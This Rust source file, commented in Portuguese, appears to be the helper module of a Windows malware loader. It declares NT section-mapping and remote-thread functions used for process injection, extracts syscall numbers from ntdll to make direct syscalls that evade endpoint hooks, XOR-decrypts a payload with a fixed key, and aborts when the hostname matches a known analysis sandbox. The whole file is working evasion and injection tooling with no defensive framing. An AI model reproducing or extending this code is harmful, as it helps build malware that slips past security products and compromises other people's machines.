use std::ffi::{CStr, CString};
use std::io::Error;
use hostname::get;
use winapi::ctypes::c_void;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::minwindef::{DWORD, HMODULE};
use winapi::shared::ntdef::{HANDLE, LARGE_INTEGER, NTSTATUS, ULONG};
use winapi::um::libloaderapi::GetProcAddress;

/* ---- [Defines] ---- */

pub const XOR_KEY: u8 = 0x5A;


extern "system" {
    fn NtDelayExecutionSyscall(alertable: i32, delay_interval: *mut core::ffi::c_void) -> NTSTATUS;
}

pub unsafe fn nt_delay_execution_syscall(alertable: i32, delay_interval: *mut core::ffi::c_void) -> NTSTATUS {
    NtDelayExecutionSyscall(alertable, delay_interval)
}

#[repr(C)]
#[allow(non_snake_case)]
pub struct UNICODESTRING {
    Length: u16,
    MaximumLength: u16,
    Buffer: *mut u16,
}

#[repr(C)]
#[allow(non_snake_case)]
pub struct OBJECTATTRIBUTES {
    Length: winapi::shared::minwindef::ULONG,
    RootDirectory: winapi::um::winnt::HANDLE,
    ObjectName: *mut UNICODESTRING,
    Attributes: winapi::shared::minwindef::ULONG,
    SecurityDescriptor: *mut std::ffi::c_void,
    SecurityQualityOfService: *mut std::ffi::c_void,
}
extern "C" {
    pub fn NtCreateSection(
        section_handle: *mut winapi::um::winnt::HANDLE,
        desired_access: winapi::shared::minwindef::ULONG,
        object_attributes: *mut OBJECTATTRIBUTES,
        maximum_size: *mut LARGE_INTEGER,
        page_attributes: winapi::shared::minwindef::ULONG,
        section_attributes: winapi::shared::minwindef::ULONG,
        file_handle: winapi::um::winnt::HANDLE,
    ) -> NTSTATUS;

    pub fn NtMapViewOfSection(
        section_handle: winapi::um::winnt::HANDLE,
        process_handle: winapi::um::winnt::HANDLE,
        base_address: *mut *mut std::ffi::c_void,
        zero_bits: usize,
        commit_size: SIZE_T,
        section_offset: *mut LARGE_INTEGER,
        view_size: *mut SIZE_T,
        inherit_disposition: DWORD,
        allocation_type: winapi::shared::minwindef::ULONG,
        win32_protect: winapi::shared::minwindef::ULONG,
    ) -> NTSTATUS;

    pub fn NtCreateThreadEx(
        thread_handle: *mut HANDLE,
        desired_access: ULONG,
        object_attributes: *mut OBJECTATTRIBUTES,
        process_handle: HANDLE,
        start_address: *mut c_void,
        parameter: *mut c_void,
        create_flags: ULONG,
        zero_bits: SIZE_T,
        stack_size: SIZE_T,
        maximum_stack_size: SIZE_T,
        attribute_list: *mut c_void,
    ) -> NTSTATUS;
}



#[repr(C)]
#[allow(non_snake_case)]
pub struct CLIENTID {
    UniqueProcess: *mut std::ffi::c_void,
    UniqueThread: *mut std::ffi::c_void,
}





pub type SysNtCreateSection = unsafe extern "system" fn(
    section_handle: *mut HANDLE,
    desired_access: ULONG,
    object_attributes: *mut OBJECTATTRIBUTES,
    maximum_size: *mut LARGE_INTEGER,
    page_attributes: ULONG,
    section_attributes: ULONG,
    file_handle: HANDLE,
) -> NTSTATUS;

pub type SysNtMapViewOfSection = unsafe extern "system" fn(
    section_handle: HANDLE,
    process_handle: HANDLE,
    base_address: *mut *mut c_void,
    zero_bits: usize,
    commit_size: SIZE_T,
    section_offset: *mut LARGE_INTEGER,
    view_size: *mut SIZE_T,
    inherit_disposition: DWORD,
    allocation_type: ULONG,
    win32_protect: ULONG,
) -> NTSTATUS;


/*
*@brief pega o opcode SSN da função desejada através da NTDLL
*@param h_ntdll handle da ntdll
*@param func_name endereço da função desejada
*/
pub fn get_ssn(h_ntdll: HMODULE, func_name: &str) -> Result<u32, Error> {
    let func_cstr = CString::new(func_name).unwrap();

    unsafe {
        let func_ptr = GetProcAddress(h_ntdll, func_cstr.as_ptr());
        if func_ptr.is_null() {
            return Err(Error::last_os_error());
        }

        let func_bytes = std::slice::from_raw_parts(func_ptr as *const u8, 20); // pega mais bytes por segurança

        // Padrão 1: clássico - B8 XX XX XX XX
        if func_bytes[0] == 0xB8 {
            return Ok(u32::from_le_bytes([
                func_bytes[1],
                func_bytes[2],
                func_bytes[3],
                func_bytes[4],
            ]));
        }

        // Padrão 2: mov r10, rcx; mov eax, XX - 4C 8B D1 B8 XX XX XX XX
        if func_bytes[0] == 0x4C && func_bytes[1] == 0x8B && func_bytes[2] == 0xD1 && func_bytes[3] == 0xB8 {
            return Ok(u32::from_le_bytes([
                func_bytes[4],
                func_bytes[5],
                func_bytes[6],
                func_bytes[7],
            ]));
        }

        // (opcional) log para debug
        println!(
            "[!] {} não bateu com padrões conhecidos. Primeiros bytes: {:02X?}",
            func_name,
            &func_bytes[..10]
        );

        Err(Error::new(
            std::io::ErrorKind::Other,
            "Unexpected instruction format",
        ))
    }
}



pub fn check_hostname_is_valid() -> Result<bool, Error>
{
    return match get() {
        Ok(hostname) => {
            let hostname_str = hostname.to_string_lossy();
            if hostname_str.eq_ignore_ascii_case("HAL9TH") {
                Ok(false)
            } else {
                println!("Hostname é: {}", hostname_str);
                Ok(true)
            }
        }
        Err(e) => {
            eprintln!("Erro ao obter hostname: {}", e);
            Ok(false)
        }
    }
}

pub fn xor_decrypt(data: &mut [u8]) {
    for byte in data.iter_mut() {
        *byte ^= XOR_KEY;
    }
}
